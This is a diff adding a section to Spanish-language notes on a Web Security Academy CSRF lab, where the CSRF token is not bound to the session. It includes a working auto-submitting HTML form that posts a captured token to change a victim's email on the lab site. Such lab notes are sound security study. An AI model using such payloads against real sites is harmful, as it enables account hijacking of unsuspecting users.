@@ -82,7 +82,21 @@ Mismo codigo que la peticion POST(arriba)
 
 ## CSRF where token is not tied to user session
 
+En este caso el token CSRF no se tiene alineado con una sesion si no que mientras sea un token valido aplica para cualquier cookie
+para llevar acabo el ataque se debe de interceptar el token cuando se va a cambiar el email en este caso el tuyo de tu cuenta 
+que tienes control y posteriormente generar el ataque:
 
+```
+<form method="POST" action="https://0a5700ee037a2cddc05e1e0900a6006e.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="a1&#64;test&#46;com"> 
+    <input type="hidden" name="csrf" value="eqbRsc6Ot2hIrzUbUZUYn6CEvoHBLAJ3">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+
+```
 
 
 NOTA: Se puede utilizar la herramienta "csrf-poc-generator-master" para generar un poc de una peticion genera un script parecido.
